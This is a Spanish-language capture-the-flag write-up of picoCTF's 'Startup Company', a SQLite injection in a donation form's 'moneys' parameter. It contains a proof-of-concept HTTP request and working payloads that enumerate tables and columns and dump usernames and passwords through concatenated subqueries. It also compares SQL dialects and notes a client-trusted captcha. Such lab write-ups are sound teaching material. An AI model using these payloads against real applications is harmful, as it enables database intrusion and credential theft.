# Writeup: Startup_Company
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: PicoCTF – Startup Company (SQLite Injection)


```bash
## 📌 Resumen
```


La aplicación web permite a los usuarios registrarse, iniciar sesión y donar dinero en `/contribute.php`.  

Se detecta una **inyección SQL** en el parámetro `moneys` del formulario. El motor de base de datos es **SQLite** y la inyección se explota mediante **subconsultas concatenadas** (`||`) porque la consulta original no permite `UNION`.  

La bandera se encuentra en la tabla `startup_users`, columna `wordpass` del usuario `champ`.


---


```bash
## 🔍 Reconocimiento inicial
```


Tras registrarse con `kr3s4l4:pass` e interactuar con `/contribute.php`, se observa:


- Un campo oculto `captcha` que el servidor envía y espera de vuelta.
- El parámetro `moneys` es vulnerable a inyección.

```bash
### Prueba de concepto
```


Se envía:


```http

POST /contribute.php HTTP/1.1

**Cookie**: PHPSESSID=4cb7328a6be999b6a8d91a7c55ec26d3

Content-Type: application/x-www-form-urlencoded


captcha=55&moneys=10' || sqlite_version(); --


La respuesta contiene:

text


You're latest contribution: $103.27.2


✅ Confirmación:


```
    El motor es SQLite (versión 3.27.2).

    La inyección funciona y el resultado se refleja en el mensaje.

```

🧠 ¿Por qué no usar UNION SELECT?


Al intentar 10' UNION SELECT 1 -- se obtiene:

text


Warning: SQLite3::query(): Unable to prepare statement: 1, near "UNION": syntax error


Esto indica que la consulta original no es un SELECT, probablemente un UPDATE o INSERT. Por ejemplo:

sql


UPDATE contributions SET amount = ? WHERE captcha = ? AND user_id = ?


En ese contexto, UNION no es válido. Sin embargo, las subconsultas escalares sí lo son. La técnica consiste en concatenar el resultado de una subconsulta al valor numérico inyectado.

🛠️ Payloads utilizados (paso a paso)

1. Listar todas las tablas
sql


10' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table') --


```
    sqlite_master → catálogo interno (como information_schema en otros motores).

    group_concat() → une todos los nombres en una sola cadena.

    Resultado (fragmento): admin,ron,veronica,brick,brian,champ,the_real_flag,kr3s4l4

```

2. Ver columnas de la tabla startup_users
sql


10' || (SELECT group_concat(name) FROM pragma_table_info('startup_users')) --


```
    PRAGMA table_info('tabla') → devuelve las columnas de una tabla en SQLite.

    Alternativa: SELECT sql FROM sqlite_master WHERE name='startup_users'

```

Resultado: id, nameuser, wordpass

3. Extraer la bandera
sql


10' || (SELECT group_concat(nameuser || ':' || wordpass) FROM startup_users) --


Pero el payload que realmente funcionó fue (basado en los nombres reales de columnas):

sql


10' || (SELECT group_concat(nameuser, wordpass) FROM startup_users) --


Respuesta obtenida:

text


...champpicoCTF{************************}the_real_flag...


✅ Bandera: picoCTF{***********************}

🆚 Comparativa: SQLite vs otros motores

Característica	SQLite	MySQL / MariaDB	PostgreSQL

Metadatos	sqlite_master	information_schema.tables	information_schema.tables

Concatenación	||	CONCAT() o || (según modo)	||

Agrupar filas	group_concat()	GROUP_CONCAT()	string_agg()

Obtener columnas	PRAGMA table_info('tabla')	SHOW COLUMNS o information_schema.columns	information_schema.columns

Comentarios	-- (requiere espacio)	-- o #	--


¿Por qué no funcionarían payloads de MySQL?


```
    information_schema no existe en SQLite.

    GROUP_CONCAT() se escribe en minúsculas (group_concat()).

    UNION no es viable por el tipo de consulta.

```

🧩 Vulnerabilidad adicional: captcha manipulable


El servidor calcula el nuevo captcha como captcha_actual - (moneys/2) pero confía ciegamente en el valor enviado por el cliente. Esto permite forzar valores negativos o cero, pero no fue necesario porque la inyección SQL fue más directa.

🏁 Flag final

text


picoCTF{***************************}

